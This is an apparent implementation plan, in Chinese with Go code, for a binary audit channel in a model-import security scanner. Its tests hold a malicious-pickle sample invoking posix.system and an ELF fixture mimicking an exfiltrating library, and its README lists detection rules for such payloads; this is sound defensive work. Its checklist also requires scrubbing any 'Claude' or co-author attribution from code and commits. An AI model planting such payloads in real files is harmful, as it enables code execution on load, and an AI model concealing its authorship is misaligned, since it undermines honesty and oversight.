> **注（提示词结构，不改行为）**：`binaryFileAnalysisPromptTemplate` 把 `## 判定基准` 放在**证据块之后**且没有尾部重述。这与仓库已实测的 **finding 级**先例不一致——`teellm/ollama_backend.go:15` 的 `findingAnalysisPromptTemplate` 是**准则前置**（`## 判定优先级与安全边界` 在第 17 行、证据之前）**加尾部** `## 判定提醒`（第 46 行），由 `TestFindingAnalysisPromptOrderAndVerbs`/`TestFindingAnalysisPromptCachingInvariants`（`teellm/ollama_backend_test.go:443`/`:536`）钉住——但它与自己的**文件级**同类 `fileAnalysisPromptTemplate`（`internal/codeaudit/verifier.go:300-317`，同样是准则在证据之后、无尾部重述）一致，所以本任务**保持现状不重组**：那条实测覆盖的是 finding 级提示词，没有任何针对文件级提示词的测量，而在上一条注成立的前提下它今天也到不了模型。留这条注记只为给后来者一个杠杆——**若将来要优化文件级提示词的延迟，第一个该试的杠杆是把准则前置**（与 finding 级先例同形），而且必须照那条先例的**完整形态**做：前置**并**在尾部重述，因为那条先例记录的是"只前置、无尾部重述会系统性转严"。

- [ ] **Step 6: 跑测试确认通过**

```bash
go test ./internal/codeaudit/ -run 'TestBinaryFilePrompt|TestSourceFilePrompt|TestGenerateAuditReport' -v 2>&1 | tail -20
```

预期全 PASS。

- [ ] **Step 7: 提交**

```bash
gofmt -l internal/codeaudit/ ; go vet ./internal/codeaudit/
git add internal/codeaudit/verifier.go internal/codeaudit/llm_test.go
git commit -m "feat(audit): give binary files their own file-level audit prompt"
```

---

### Task 14: 配置项与装配

**Files:**
- Modify: `internal/config/config.go`, `internal/config/config_test.go`, `internal/app/taa/app.go`, `internal/app/taa/app_test.go`, `internal/controller/route.go`, `internal/controller/import_processing.go`, `configs/*.json`
- Test: `internal/config/config_test.go`, `internal/app/taa/app_test.go`

- [ ] **Step 1: 写失败测试**

追加到 `internal/config/config_test.go`：

> `writeTestConfig` 的签名是 `func writeTestConfig(t *testing.T, path, content string)`——**没有返回值**，它把内容写到 `path`。所以每一处都按文件里既有调用点的写法来：先 `path := filepath.Join(t.TempDir(), DefaultFileName)`，再 `writeTestConfig(t, path, ...)`。`filepath` 与 `DefaultFileName` 在 `config_test.go` 里都已可用。

```go
// TestBinaryAuditConfigDefaultsAndOverrides pins the switch that makes this
// feature reversible: the channel is on unless a deployment says otherwise, and
// every limit can be moved without touching code.
func TestBinaryAuditConfigDefaultsAndOverrides(t *testing.T) {
	t.Run("absent means enabled with the adapter's defaults", func(t *testing.T) {
		path := filepath.Join(t.TempDir(), DefaultFileName)
		writeTestConfig(t, path, `{"security":{"codeScanEngine":"regex"}}`)
		cfg, err := LoadStartupConfig(path)
		if err != nil {
			t.Fatalf("LoadStartupConfig: %v", err)
		}
		if !cfg.BinaryAuditEnabled {
			t.Error("BinaryAuditEnabled = false when the section is absent; the default must be on")
		}
		if cfg.BinaryAuditMaxArchiveMembers != 0 {
			t.Errorf("BinaryAuditMaxArchiveMembers = %d, want 0 (meaning \"use the codeaudit default\")",
				cfg.BinaryAuditMaxArchiveMembers)
		}
	})

	t.Run("an explicit false disables it", func(t *testing.T) {
		path := filepath.Join(t.TempDir(), DefaultFileName)
		writeTestConfig(t, path, `{"security":{"binaryAudit":{"enabled":false}}}`)
		cfg, err := LoadStartupConfig(path)
		if err != nil {
			t.Fatalf("LoadStartupConfig: %v", err)
		}
		if cfg.BinaryAuditEnabled {
			t.Error("BinaryAuditEnabled = true after an explicit false")
		}
	})

	t.Run("limits are read", func(t *testing.T) {
		path := filepath.Join(t.TempDir(), DefaultFileName)
		writeTestConfig(t, path,
			`{"security":{"binaryAudit":{"maxArchiveMembers":17,"highEntropyThreshold":7.25}}}`)
		cfg, err := LoadStartupConfig(path)
		if err != nil {
			t.Fatalf("LoadStartupConfig: %v", err)
		}
		if cfg.BinaryAuditMaxArchiveMembers != 17 {
			t.Errorf("BinaryAuditMaxArchiveMembers = %d, want 17", cfg.BinaryAuditMaxArchiveMembers)
		}
		if cfg.BinaryAuditHighEntropyThreshold != 7.25 {
			t.Errorf("BinaryAuditHighEntropyThreshold = %v, want 7.25", cfg.BinaryAuditHighEntropyThreshold)
		}
	})

	t.Run("a negative limit is rejected rather than read as a default", func(t *testing.T) {
		// The guarantee is the load path's: LoadStartupConfig runs
		// validateStartupConfig before anything reads the value, so a negative
		// never reaches the normalizer. codeaudit's own normalizer tests "<= 0",
		// so a negative arriving by any other route - a hand-built StartupConfig -
		// would be replaced by the default instead of rejected.
		path := filepath.Join(t.TempDir(), DefaultFileName)
		writeTestConfig(t, path, `{"security":{"binaryAudit":{"maxArchiveMembers":-1}}}`)
		if _, err := LoadStartupConfig(path); err == nil {
			t.Error("a negative limit was accepted; it would be normalised to the default and the operator would never know")
		}
	})

	t.Run("the full-scan threshold is carried through", func(t *testing.T) {
		path := filepath.Join(t.TempDir(), DefaultFileName)
		writeTestConfig(t, path, `{"security":{"binaryAudit":{"maxFullScanBytes":134217728}}}`)
		cfg, err := LoadStartupConfig(path)
		if err != nil {
			t.Fatalf("LoadStartupConfig: %v", err)
		}
		if cfg.BinaryAuditMaxFullScanBytes != 134217728 {
			t.Errorf("BinaryAuditMaxFullScanBytes = %d, want 134217728", cfg.BinaryAuditMaxFullScanBytes)
		}
	})
}
```

追加到 `internal/app/taa/app_test.go`。

**先**在 `TestBuildSecurityConfig` 的 `cfg := config.StartupConfig{...}` 字面量里补两个字段——这个测试是手工构造字面量、绕过了配置加载器，所以 `BinaryAuditEnabled` 不会自动为真，而 `BinaryAuditMaxArchiveMembers` 会停在 0：

```go
		BinaryAuditEnabled:           true,
		BinaryAuditMaxArchiveMembers: 17,
```

**再**在该测试末尾的断言之后追加：

```go
	// The binary channel's configuration is carried through rather than dropped:
	// a value that reaches the config struct and not the controller is a setting
	// an operator can write and cannot observe.
	//
	// The comparison is against the raw config value, not the resolved one. "0
	// means use the codeaudit default" resolves in exactly one place - the
	// codeaudit normalizer every extraction path already calls - and a second
	// resolver here would be a second place for the two to disagree about what
	// the default is. The resolution itself is proven at the codeaudit level.
	if !sec.Binary.Enabled {
		t.Error("SecurityConfig.Binary.Enabled = false, want the value carried from BinaryAuditEnabled")
	}
	if sec.Binary.MaxArchiveMembers != cfg.BinaryAuditMaxArchiveMembers {
		t.Errorf("SecurityConfig.Binary.MaxArchiveMembers = %d, want the raw config value %d",
			sec.Binary.MaxArchiveMembers, cfg.BinaryAuditMaxArchiveMembers)
	}
```

- [ ] **Step 2: 跑测试确认失败**

```bash
go test ./internal/config/ -run TestBinaryAuditConfig 2>&1 | head -10
```

预期：编译失败，`unknown field BinaryAuditEnabled`。

- [ ] **Step 3: 实现配置**

修改 `internal/config/config.go`。

`StartupConfig` 在 `SemgrepTimeout` 之后追加：

```go
	// BinaryAuditEnabled turns the binary channel on for model import audits. It
	// defaults to true; turning it off is the rollback of this feature and leaves
	// an audit byte-identical to the one produced before the channel existed.
	BinaryAuditEnabled bool
	// BinaryAuditMaxArchiveMembers bounds how many members of a container are
	// examined. Zero means the codeaudit default.
	BinaryAuditMaxArchiveMembers int
	// BinaryAuditHighEntropyThreshold is the bits-per-byte above which an
	// executable section is called packed. Zero means the codeaudit default.
	BinaryAuditHighEntropyThreshold float64
	// BinaryAuditMaxFindings is the listing budget for the binary pass, not a
	// completeness bound: reaching it drops LOW findings (and only LOW - HIGH and
	// MEDIUM can block the import and are always kept) and is recorded as
	// findings_capped, and it never withholds a pass. Zero means the codeaudit
	// default.
	BinaryAuditMaxFindings int
	// BinaryAuditMaxFullScanBytes is the size above which a file is read at its
	// two ends instead of end to end. Zero means the codeaudit default. It is
	// exposed rather than fixed because it is the one limit whose right value
	// depends on the deployment's package sizes: raising it buys a complete pass
	// over a large pickle at a cost of about 3 microseconds per kibibyte.
	BinaryAuditMaxFullScanBytes int
	// BinaryAuditMaxStreamBytes bounds how much of one file the end-to-end
	// streaming pass reads. Zero means the codeaudit default (3 GiB).
	//
	// It is exposed because it is the twin of MaxFullScanBytes: the stream budget
	// is only reachable by a file that MaxFullScanBytes let through, so an
	// operator who raises MaxFullScanBytes past the stream ceiling makes the
	// stream ceiling bind - and its breach records a structural bound, which on
	// an executable kind blocks the import. Leaving it fixed while its twin is
	// exposed would turn that into an unactionable block. Two keys that move
	// together, in the same block and the same validation.
	BinaryAuditMaxStreamBytes int
```

`startupSecurityConfigFile` 在 `SemgrepTimeoutSeconds` 之后追加：

```go
	BinaryAudit startupBinaryAuditConfigFile `json:"binaryAudit"`
```

并在该结构体下方新增：

```go
// startupBinaryAuditConfigFile is the security.binaryAudit block.
//
// Every limit is a pointer so that "absent" and "zero" stay distinguishable: a
// zero the operator wrote is a limit of zero and is rejected below, while an
// absent field means "use the codeaudit default". Reading both as zero would
// turn a deliberate 0 into a silently substituted default.
type startupBinaryAuditConfigFile struct {
	Enabled              *bool    `json:"enabled"`
	MaxArchiveMembers    *int     `json:"maxArchiveMembers"`
	HighEntropyThreshold *float64 `json:"highEntropyThreshold"`
	MaxFindings          *int     `json:"maxFindings"`
	MaxFullScanBytes     *int64   `json:"maxFullScanBytes"`
	MaxStreamBytes       *int64   `json:"maxStreamBytes"`
}
```

在 `validateCodeScanEngine` 的**调用者**——`validateStartupConfig`（`internal/config/config.go:236`）——的校验序列里追加（`LoadStartupConfig` 只是调 `validateStartupConfig`，本身没有校验序列）：

```go
	if err := validateBinaryAudit(cfg); err != nil {
		return StartupConfig{}, err
	}
```

并新增：

```go
// validateBinaryAudit rejects limits that cannot mean what they say.
//
// A negative count is rejected rather than normalised: the normalisation path
// exists for "unset", and a deployment that wrote -1 has a different problem
// from one that wrote nothing. Rejecting turns it into a startup error instead
// of an audit that quietly ran with a different budget.
//
// The guarantee is path-specific, and worth stating precisely: it holds on the
// file-load path, because validateStartupConfig runs before the values are used.
// It does not hold globally. normalizeBinaryConfig tests "<= 0", so a negative
// that reaches codeaudit by another route - a hand-built StartupConfig, which is
// exactly how buildSecurityConfig is called from the app tests - is silently
// replaced by the default rather than rejected. Nothing reaches that route in
// production: the only production construction of StartupConfig goes through
// LoadStartupConfig.
func validateBinaryAudit(cfg StartupConfig) error {
	if cfg.BinaryAuditMaxArchiveMembers < 0 {
		return fmt.Errorf("security.binaryAudit.maxArchiveMembers must not be negative, got %d", cfg.BinaryAuditMaxArchiveMembers)
	}
	if cfg.BinaryAuditMaxFindings < 0 {
		return fmt.Errorf("security.binaryAudit.maxFindings must not be negative, got %d", cfg.BinaryAuditMaxFindings)
	}
	if cfg.BinaryAuditMaxFullScanBytes < 0 {
		return fmt.Errorf("security.binaryAudit.maxFullScanBytes must not be negative, got %d", cfg.BinaryAuditMaxFullScanBytes)
	}
	if cfg.BinaryAuditMaxStreamBytes < 0 {
		return fmt.Errorf("security.binaryAudit.maxStreamBytes must not be negative, got %d", cfg.BinaryAuditMaxStreamBytes)
	}
	if cfg.BinaryAuditHighEntropyThreshold < 0 || cfg.BinaryAuditHighEntropyThreshold > 8 {
		return fmt.Errorf("security.binaryAudit.highEntropyThreshold must be within [0,8] bits per byte, got %v",
			cfg.BinaryAuditHighEntropyThreshold)
	}
	return nil
}
```

在 `defaultStartupConfig()`（`internal/config/config.go:305`；注意它**未导出**，不存在 `DefaultStartupConfig` 这个符号）的返回值里，`CodeScanEngine: "semgrep",` 之后追加：

```go
		BinaryAuditEnabled: true,
```

> 这一行是**唯一**让通道默认开着的东西，原因值得写下来：`BinaryConfig.Enabled` 是 `normalizeBinaryConfig` **唯一不填默认值**的字段，因为它填不了——Go 里显式的 `false` 与零值无法区分，把零值当默认就等于让「显式关掉」永远无法生效。所以任何绕过 `defaultStartupConfig`、直接构造 `codeaudit.AuditConfig{LLM: cfg}` 而把 `Binary` 留成零值的调用方，拿到的是**关着的**通道，而不是一组默认值。生产的构造路径只有 `LoadStartupConfig → applyStartupConfigFile → defaultStartupConfig` 一条，这一行在真实启动路径上承重。

在文件配置覆盖段（`if trimmed := strings.ToLower(strings.TrimSpace(fileCfg.Security.CodeScanEngine)); trimmed != ""` 附近）追加：

```go
	if ba := fileCfg.Security.BinaryAudit; ba.Enabled != nil {
		cfg.BinaryAuditEnabled = *ba.Enabled
	}
	if ba := fileCfg.Security.BinaryAudit; ba.MaxArchiveMembers != nil {
		cfg.BinaryAuditMaxArchiveMembers = *ba.MaxArchiveMembers
	}
	if ba := fileCfg.Security.BinaryAudit; ba.HighEntropyThreshold != nil {
		cfg.BinaryAuditHighEntropyThreshold = *ba.HighEntropyThreshold
	}
	if ba := fileCfg.Security.BinaryAudit; ba.MaxFindings != nil {
		cfg.BinaryAuditMaxFindings = *ba.MaxFindings
	}
	if ba := fileCfg.Security.BinaryAudit; ba.MaxFullScanBytes != nil {
		cfg.BinaryAuditMaxFullScanBytes = int(*ba.MaxFullScanBytes)
	}
	if ba := fileCfg.Security.BinaryAudit; ba.MaxStreamBytes != nil {
		cfg.BinaryAuditMaxStreamBytes = int(*ba.MaxStreamBytes)
	}
```

- [ ] **Step 4: 装配到 controller**

修改 `internal/controller/route.go` 的 `SecurityConfig`，在 `Engine` 之后追加：

```go
	Binary             codeaudit.BinaryConfig // 二进制审计通道配置（与 Tier 1 引擎无关，两种引擎部署都生效）
```

修改 `internal/app/taa/app.go` 的 `buildSecurityConfig`，在 `return controller.SecurityConfig{` 字面量中 `Engine: engine,` 之后追加：

```go
		Binary: codeaudit.BinaryConfig{
			Enabled:              cfg.BinaryAuditEnabled,
			MaxArchiveMembers:    cfg.BinaryAuditMaxArchiveMembers,
			MaxFindings:          cfg.BinaryAuditMaxFindings,
			MaxFullScanBytes:     int64(cfg.BinaryAuditMaxFullScanBytes),
			MaxStreamBytes:       int64(cfg.BinaryAuditMaxStreamBytes),
			HighEntropyThreshold: cfg.BinaryAuditHighEntropyThreshold,
		},
```

并把 Task 12 留在 `import_processing.go` 的占位换掉：

```go
		codeaudit.AuditConfig{LLM: cfg, Binary: s.Security.Binary}, llmClient)
```

- [ ] **Step 5: 在三份配置里显式写出该段**

`configs/taa-production.json`、`configs/taa-docker.json`、`configs/taa-initrd.json` 的 `security` 块内追加（值留空表示取默认，只把开关写明）：

```json
    "binaryAudit": {
      "enabled": true
    },
```

- [ ] **Step 6: 跑测试确认通过**

```bash
go build ./... && go test ./internal/config/ ./internal/app/... ./internal/controller/... 2>&1 | tail -20
```

预期全 PASS。

- [ ] **Step 7: 提交**

```bash
gofmt -l internal/ ; go vet ./...
git add internal/config/ internal/app/ internal/controller/ configs/
git commit -m "feat(config): expose the binary audit channel through security.binaryAudit"
```

---

### Task 15: 端到端、文档与验收

**Files:**
- Test: `internal/codeaudit/binary_integration_test.go`
- Modify: `README.md`

- [ ] **Step 1: 写端到端测试**

创建 `internal/codeaudit/binary_integration_test.go`：

```go
package codeaudit

import (
	"context"
	"strings"
	"testing"
)

// TestEndToEndMaliciousPackageIsBlocked walks the whole pipeline on a package
// shaped like the ones this feature exists for: ordinary training code, a shared
// object that reaches out, and a checkpoint whose pickle stream executes on load.
//
// Every one of the three parts is load-bearing. The source file proves the
// channel did not replace the source engines; the shared object proves the
// dynamic symbol evidence reaches the verdict; the checkpoint proves the
// container recursion does. A pass that got the verdict right by another route
// would still fail this test on the per-file assertions.
func TestEndToEndMaliciousPackageIsBlocked(t *testing.T) {
	dir := t.TempDir()
	writeTestFile(t, dir, "train.py", "import torch\n\ndef train():\n    return 1\n")
	writeTestBytes(t, dir, "native/libevil.so", elfFixtureBytes(t, elfSpec{
		imports:  []string{"socket", "connect", "memfd_create"},
		needed:   []string{"libcurl.so.4"},
		text:     uniformBytes(512),
		textExec: true,
	}))
	writeTestBytes(t, dir, "checkpoint.pt", zipFixture(t, map[string][]byte{
		"archive/data.pkl": []byte("\x80\x04cposix\nsystem\n."),
	}, []string{"archive/data.pkl"}))

	cfg := AuditConfig{
		LLM:    LLMConfig{Enabled: false, Policy: "assist"},
		Binary: DefaultBinaryConfig(),
	}
	audit, err := GenerateAuditReport(context.Background(), dir, DefaultEngine(), cfg, nil)
	if err != nil {
		t.Fatalf("GenerateAuditReport: %v", err)
	}

	if audit.Conclusion.Passed {
		t.Fatalf("conclusion Passed = true for a package with a native exfiltration library and an executing checkpoint; summary: %s",
			audit.Conclusion.Summary)
	}
	if audit.Conclusion.RiskLevel != "CRITICAL" {
		t.Errorf("RiskLevel = %s, want CRITICAL", audit.Conclusion.RiskLevel)
	}

	byFile := map[string][]string{}
	for _, fr := range audit.FileReports {
		for _, f := range fr.Findings {
			byFile[f.File] = append(byFile[f.File], f.RuleID)
		}
	}
	assertHasRule(t, byFile, "native/libevil.so", "NET_002")
	assertHasRule(t, byFile, "native/libevil.so", "BIN_002")
	assertHasRule(t, byFile, "checkpoint.pt", "PKL_001")

	if audit.ScanMetadata.Binary == nil {
		t.Fatal("ScanMetadata.Binary is nil")
	}
	if got := audit.ScanMetadata.Binary.Kinds[string(KindELF)]; got != 1 {
		t.Errorf("Binary.Kinds[elf] = %d, want 1", got)
	}
	if got := audit.ScanMetadata.Binary.Kinds[string(KindArchive)]; got != 1 {
		t.Errorf("Binary.Kinds[archive] = %d, want 1", got)
	}
	if audit.ScanMetadata.Binary.FilesCount != 2 {
		t.Errorf("Binary.FilesCount = %d, want 2 (the .so and the .pt; train.py is text)", audit.ScanMetadata.Binary.FilesCount)
	}
}

// TestEndToEndCleanPackageStillPasses is the other half, and the one that decides
// whether the feature is usable. A model package is mostly weights, framework
// imports and ordinary code; if any of those produced a blocking finding the
// channel would be turned off in a week.
func TestEndToEndCleanPackageStillPasses(t *testing.T) {
	dir := t.TempDir()
	writeTestFile(t, dir, "train.py", "import torch\n\ndef train():\n    return 1\n")
	// A shared object with the imports an accelerated kernel actually has, plus a
	// tensor blob that is near-random by nature and must not read as packed code.
	writeTestBytes(t, dir, "native/libkernel.so", elfFixtureBytes(t, elfSpec{
		imports: []string{"malloc", "memcpy", "pthread_create", "cblas_sgemm"},
		needed:  []string{"libc.so.6", "libm.so.6", "libgomp.so.1"},
		text:    []byte("ordinary kernel code"),
	}))
	writeTestBytes(t, dir, "weights.safetensors", uniformBytes(4096))

	cfg := AuditConfig{
		LLM:    LLMConfig{Enabled: false, Policy: "assist"},
		Binary: DefaultBinaryConfig(),
	}
	audit, err := GenerateAuditReport(context.Background(), dir, DefaultEngine(), cfg, nil)
	if err != nil {
		t.Fatalf("GenerateAuditReport: %v", err)
	}
	if !audit.Conclusion.Passed {
		t.Fatalf("a clean package was blocked; findings: %s", dumpFindings(audit))
	}
	if audit.ScanMetadata.Binary.FilesCount != 2 {
		t.Errorf("Binary.FilesCount = %d, want 2", audit.ScanMetadata.Binary.FilesCount)
	}
}

// TestEndToEndBoundedExecutableBlocks pins the fail-closed direction that is
// easiest to get wrong: a shared object the scan could not finish reading must
// block, because a verdict reached without reading it is not a verdict.
//
// The limit the fixture reaches is MaxStreamBytes, the per-file read budget,
// rather than a per-section cap - there is no per-section cap any more (see
// BinaryConfig), and a section that declares more than the file holds is caught
// by the read-versus-declared comparison instead. Setting the budget below the
// file size is what makes both readers stop early: the strings pass records the
// budget bound, and the section read comes up short of .text's declared size and
// records the same fact from the other side. Either way the file is a bounded
// executable, and a bounded executable withholds the pass.
func TestEndToEndBoundedExecutableBlocks(t *testing.T) {
	dir := t.TempDir()
	writeTestBytes(t, dir, "native/libbig.so", elfFixtureBytes(t, elfSpec{
		imports:  []string{"malloc"},
		text:     uniformBytes(4096),
		textExec: true,
	}))

	cfg := AuditConfig{
		LLM: LLMConfig{Enabled: false, Policy: "assist"},
		Binary: BinaryConfig{
			Enabled:        true,
			MaxStreamBytes: 16, // smaller than the file, so neither pass can finish reading it
		},
	}
	audit, err := GenerateAuditReport(context.Background(), dir, DefaultEngine(), cfg, nil)
	if err != nil {
		t.Fatalf("GenerateAuditReport: %v", err)
	}
	if audit.ScanMetadata.Binary.BoundedExecutable != 1 {
		t.Errorf("BoundedExecutable = %d, want 1", audit.ScanMetadata.Binary.BoundedExecutable)
	}
	if audit.Conclusion.Passed {
		t.Error("Passed = true after an executable file could not be read in full; the gap did not reach the verdict")
	}
}

func assertHasRule(t *testing.T, byFile map[string][]string, file, rule string) {
	t.Helper()
	for f, rules := range byFile {
		if !strings.HasSuffix(f, file) {
			continue
		}
		for _, r := range rules {
			if r == rule {
				return
			}
		}
		t.Errorf("%s has rules %v, want %s among them", f, rules, rule)
		return
	}
	t.Errorf("no file report for %s; findings were %v", file, byFile)
}

func dumpFindings(audit *AuditReport) string {
	var b strings.Builder
	for _, fr := range audit.FileReports {
		for _, f := range fr.Findings {
			b.WriteString(f.File + ":" + f.RuleID + ":" + f.Severity + " ")
		}
	}
	return b.String()
}
```

- [ ] **Step 2: 跑测试**

```bash
go test ./internal/codeaudit/ -run TestEndToEnd -v 2>&1 | tail -30
```

预期全 PASS。若 `TestEndToEndCleanPackageStillPasses` 失败，先看命中的是哪个规则：`weights.safetensors` 只应产出 strings 证据（数据文件不做熵判定，见 §2.6），`libkernel.so` 的导入都在良性清单里（`malloc`/`memcpy`/`pthread_create` 明确不匹配任何规则）。任一命中都说明该规则表比设计更宽，改规则表而不是改测试。

- [ ] **Step 3: 跑全量测试与构建**

```bash
cd /home/hjy/taa
CGO_ENABLED=0 GOOS=linux go build -o bin/taa ./cmd/taa
go test ./... 2>&1 | grep -vE "^ok|no test files" | head -30
```

预期：构建成功（initrd 要求静态链接），无 FAIL。

- [ ] **Step 4: 更新 README**

在 README 的代码审计章节追加一节（放在 Tier 1 引擎说明之后）：

```markdown
### 二进制审计通道

源码审计之外，导入审计还会遍历模型包中的**二进制文件**，与所选 Tier 1 引擎无关——正则臂与 semgrep 臂的部署都生效。

- **识别**：按文件内容判定（ELF / zip 容器 / gzip / pickle / numpy / 其余二进制），扩展名仅作补充。改后缀不能绕过；`.py` 结尾的二进制同样会被认领。
- **证据**：ELF 动态导入符号与 `DT_NEEDED`、节区构成与香农熵、可打印字符串、容器成员（zip/gzip 内部最多递归一层）、pickle 的 `GLOBAL`/`STACK_GLOBAL`/`INST` 目标（带 memo 表的 opcode 解释器）、超过 64 MiB 的文件读首尾各 1 MiB（捕捉 zip 末尾追加的载荷，并把单文件成本钉在约 190 ms）。
- **判定**：证据行按规则表匹配，产出 `Finding` 并标记 `binary_kind` / `evidence_source` / `binary_offset`。**结构性证据**（ELF 动态符号、`DT_NEEDED`、熵）走共享规则 `NET_002`/`CMD_001`/`DYN_001`，其严重级从源码规则表读取，不另立一套；二进制专有规则 `BIN_001`（可执行节区熵近随机，HIGH）、`BIN_002`（`memfd_create`/`fexecve`，HIGH）、`PKL_001`（pickle 反序列化执行，HIGH）。**字符串证据**不共享源码臂的 id——`CMD_002`/`PER_002`/`FIL_002`/`ENV_002` 是四个独立的 LOW 族，理由见下：一条 finding 只有被文件无法偶然产生的结构背书时才可以是 HIGH，而一段字符串常量不是；源码臂的同名族 `CMD_001`/`PER_001`/`FIL_001`/`ENV_001` 在共享表里是 HIGH/MEDIUM，借用它们会把「某个字面量里出现了某个词」抬到阻断级别。`OBF_001` 在二进制臂**没有**族：它的旧模式 `^[A-Za-z0-9+/]{120,}={0,2}$` 命中了 28 个合法共享库中的 23 个（`.pyc` 常量池和二进制数据里遍地是长 base64 字母表串），收紧字母表或抬高下限都治不了，只保留源码臂的调用点版本。
- **复核**：二进制 finding 与源码 finding 走同一条 LLM 路径；文件级分析使用二进制专用 prompt（现有 prompt 面向 Python 源码，不适用）。**诚实性**：文件级分支只在调用方实现 `FileAnalyzer` 时可达，而生产的 `LLMClient`（`teellm.Client`）没有 `AnalyzeFile`，所以它今天只被测试 mock 驱动，不是线上行为——这与源码文件路径的既有处境完全相同，本计划不改变它（见 Task 13 的两条注）。
- **完整性**：`scan_metadata.binary` 记录 `files_count` / `kinds` / `bounded_executable` / `bounded_data` / `incomplete` / `errored` / `findings_capped` / `findings_dropped` / `max_findings`。可执行格式的结构抽取被截断、文件无法读取、整趟无法运行，任一项都会使 `ProvesCleanScan()` 为假——fail-closed 下即阻断导入；纯数据文件（张量、npy）的证据截断只记录、不阻断。**finding 上限不属于完整性**：触顶只写 `findings_capped`/`findings_dropped`，不写 `scan_metadata.truncated`、不阻断；cap 只花 LOW 这一档，能阻断的 HIGH（`assist` 与 `gate`）与 MEDIUM（`gate`）无论预算如何都保留。
- **配置**：`security.binaryAudit.enabled`（默认 `true`）、`maxArchiveMembers`、`highEntropyThreshold`、`maxFindings`（默认 50，独立于源码臂的 200；是清单预算，调小只会丢 LOW，不会丢任何能阻断的 finding——`assist` 与 `gate` 下的 HIGH、`gate` 下的 MEDIUM——也不会阻断）、`maxFullScanBytes`（默认 64 MiB）、`maxStreamBytes`（默认 3 GiB；与 `maxFullScanBytes` 成对，抬高后者才会让前者生效）。关闭它即回滚，审计行为与引入该通道之前逐字节一致。
- **边界**：PE/Mach-O 不做结构解析（本平台不加载），xz/zstd/bzip2/7z 容器与 tar 不打开，纯文本非源码文件不审，嵌套归档只递归一层，pickle 解释器只跑在被声明为 pickle 的流上（因此不认领贴在非 pickle 文件尾部、头部无 pickle 魔数的 pickle）。详见 `.claude/plans/2026-10-10-binary-code-audit.md` §2。
```

- [ ] **Step 5: 提交**

```bash
gofmt -l internal/ ; go vet ./...
git add internal/codeaudit/binary_integration_test.go README.md
git commit -m "test(audit): cover the binary channel end to end and document it"
```

本计划文件已在开工前入库（`.claude/` 在 `.gitignore` 中，需 `git add -f`），此处无需再提交。

---

## 4. 验收清单

全部任务完成后逐项确认：

- [ ] `CGO_ENABLED=0 GOOS=linux go build -o bin/taa ./cmd/taa` 成功（initrd 要求静态链接）。
- [ ] `go test ./...` 无 FAIL。**尤其**：`internal/codeaudit` 的既有 fail-closed、gate semantics、report fields、corpus parity 用例全部保持通过——它们是这次改动的回归网。
- [ ] `git grep -n "Co-Authored-By\|anthropic\|Claude" -- '*.go'` 无命中（提交信息同样不得出现）。
- [ ] `go test ./internal/codeaudit/ -run 'TestGenerateAuditReport' -v`：`regex` 子用例必须 **PASS**；`semgrep` 子用例在装有 CLI 的机器上必须 PASS，在没装的机器上会 **SKIP**——跳过不等于通过，它是「这一条没有被验证」。所以在没装 semgrep 的机器上，必须在报告里显式记下它被跳过了，或者换一台装了的机器重跑。（`TestGenerateAuditReportRunsTheBinaryChannelForEveryEngine` 的两个子用例同理，它内部对 semgrep 也是这个 skip 形状。）
- [ ] 用一个真实模型包（含 `.pt` 与任意 `.so`）在容器里跑一次导入，确认 `auditReportJSON` 里出现 `binary_kind`/`evidence_source` 字段，且 `scan_metadata.binary.files_count > 0`；**同一个包**上确认 `target.files_scanned >= scan_metadata.binary.files_count` 且 `target.files_scanned > 0`。两条必须合看：单独拿 `0 >= 0` 也能满足那个不等式，所以「前者不小于后者」只有在 `files_count > 0` 成立时才算被验证。
- [ ] 二进制臂触顶时 `scan_metadata.binary.findings_capped` 为 `true` 且 `findings_dropped > 0`，而 **`scan_metadata.truncated` 仍为 `false`**。这一条是本计划最容易写反的地方，所以两个方向都要验：**必须在会触顶的输入上验证**——造一个二进制 finding 数超过 `BinaryConfig.MaxFindings`（默认 50）的包，确认 `scan_metadata.binary.findings_capped == true`；再抓同一个包，确认 `scan_metadata.truncated == false`。反过来的形状（触顶即把 `truncated` 置真）会让二进制通道因为"找到太多"而删包，而它丢掉的只会是 LOW——LOW 在 `assist` 与 `gate` 两种策略下都不阻断，能阻断的 HIGH 和 MEDIUM 无论预算如何都保留（`ScanDirectory` 的 cap 只花 LOW 这一档；`gate` 下 `passed` 是 `High == 0 && Medium == 0`，所以 MEDIUM 也必须留，理由见该处注释）——对一个普通包跑这一条永远是「没错顶」，等于没验。
- [ ] 把 `security.binaryAudit.enabled` 设为 `false` 再跑一次，确认 `scan_metadata.binary` 缺失且结论与改动前一致（回滚可用）。
- [ ] （**回归护栏，不是本功能的验收项**）`UnsupportedExts` 仍恒为 0——本计划**不**动它，任何让它非零的改动都会使每个真实包被判定为非完整扫描。它列在这里，是因为它属于同一次改动所以要一起回归，不是因为这个功能会让它变化。

## 5. 已知风险与对策

| 风险 | 对策 |
| --- | --- |
| `elfFixtureBytes` 的字节布局写错，Task 5–15 全部建立其上 | `TestELFFixtureIsReadByTheStandardLibrary` 先于一切断言检查夹具本身；失败时按 `debug/elf` 的报错逐字段核对 |
| 大模型包（数 GB）的 `.pt` 让导入变慢 | 证据流式读取，无整文件驻留；容器成员按需解压且有总额预算；超过 `MaxFullScanBytes`（默认 64 MiB）的文件只读首尾各 1 MiB，把单文件成本钉在约 190 ms |
